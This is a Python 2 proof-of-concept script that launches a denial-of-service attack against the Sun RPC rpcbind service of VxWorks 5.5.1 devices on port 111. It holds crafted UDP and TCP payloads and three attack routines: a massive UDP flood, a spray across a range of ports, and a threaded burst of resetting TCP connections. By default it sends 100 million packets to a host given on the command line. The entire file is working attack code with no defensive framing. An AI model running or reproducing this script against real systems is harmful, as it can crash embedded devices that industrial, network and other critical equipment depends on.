#!/usr/bin/env python
# encoding: utf-8

# VxWorks version 5.5.1, WIND version 2.6
# DOS on udp port 111, Sun RPC rpcbind
# By dog2@404

import time
import socket
import struct
import multiprocessing as mp


UDP_PAYLOAD = '\x72\xfe\x1d\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0\x00\x01\x97\x7c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
TCP_PAYLOAD = '\x80\x00\x00\x28\x72\xfe\x1d\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0\x00\x01\x97\x7c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

def poc1(host, rpcPort=111, pktNum=6859):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for i in xrange(pktNum):
        sock.sendto(UDP_PAYLOAD, (host, 111))

def poc2(host, rpcPort=111, portNum=26):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for port in xrange(rpcPort, rpcPort+portNum+1):
        sock.sendto(UDP_PAYLOAD, (host, port))

def poc3(host, rpcPort=111, portNum=55):
    def send(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            l_onoff = 1
            l_linger = 0
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                         struct.pack('ii', l_onoff, l_linger))
            sock.close()
        except socket.error as err:
            #print err
            pass

    # multiprocess
    #procs = []
    #for port in xrange(rpcPort, rpcPort+portNum+1):
        #procs.append(mp.Process(target=send, args=(port,), kwargs={}))
    #for p in procs:
        #p.start()
    #for p in procs:
        #p.join()

    # threadpool
    import threadpool
    t = threadpool.ThreadPool(100)
    req = threadpool.makeRequests(
        callable_=send,
        args_list=[port for port in xrange(rpcPort, rpcPort+portNum+1)],
    )
    [t.putRequest(r) for r in req]
    t.wait()

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, rpcPort))
        sock.send(TCP_PAYLOAD)
        sock.close()
    except socket.error as err:
        print err

    #for port in xrange(rpcPort, rpcPort+portNum+1):
        ##print port,
        #try:
            #sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #sock.connect((host, port))
            #l_onoff = 1
            #l_linger = 0
            #sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                         #struct.pack('ii', l_onoff, l_linger))
            #sock.close()
        #except socket.error as err:
            ##print err
            #pass
    #try:
        #sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #sock.connect((host, rpcPort))
        #sock.send(TCP_PAYLOAD)
        #sock.close()
    #except socket.error as err:
        #print err


if __name__ == '__main__':
    import sys

    poc1(host=sys.argv[1], rpcPort=111, pktNum=100000000)
    #poc2(host=sys.argv[1], rpcPort=111, portNum=27)
    #poc3(host=sys.argv[1], rpcPort=111)